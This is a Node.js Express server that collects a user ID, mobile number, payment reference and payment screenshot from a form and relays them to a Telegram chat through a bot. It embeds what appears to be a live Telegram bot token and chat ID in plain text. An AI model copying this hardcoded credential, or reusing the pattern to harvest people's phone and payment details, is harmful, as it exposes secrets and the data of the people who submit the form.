const express = require("express");
const multer = require("multer");
const fs = require("fs");
const fetch = require("node-fetch");
const FormData = require("form-data");

const app = express();
const upload = multer({ dest: "uploads/" });

const BOT_TOKEN = "7427344544:AAEvwrF4_i1CmKI2nRANnRAoBJeld0MkM9A";
const CHAT_ID = "5963414856";

app.use(express.static("."));
app.use(express.urlencoded({ extended: true }));

app.post("/submit", upload.single("screenshot"), async (req, res) => {
  const { uid, mobile, utr } = req.body;
  const file = req.file;

  const caption = `🔥 Blaze Entry 🔥\nUID: ${uid}\nMobile: ${mobile}\nUTR: ${utr}`;

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", caption);

  if (file) {
    form.append("photo", fs.createReadStream(file.path));
  } else {
    form.append("photo", fs.createReadStream("QR.png"));
  }

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders()
    });

    if (file) fs.unlinkSync(file.path);
    res.send("<h2 style='text-align:center;'>✅ Sent Successfully!</h2>");
  } catch (err) {
    console.error(err);
    res.send("<h2 style='text-align:center;'>❌ Error occurred!</h2>");
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
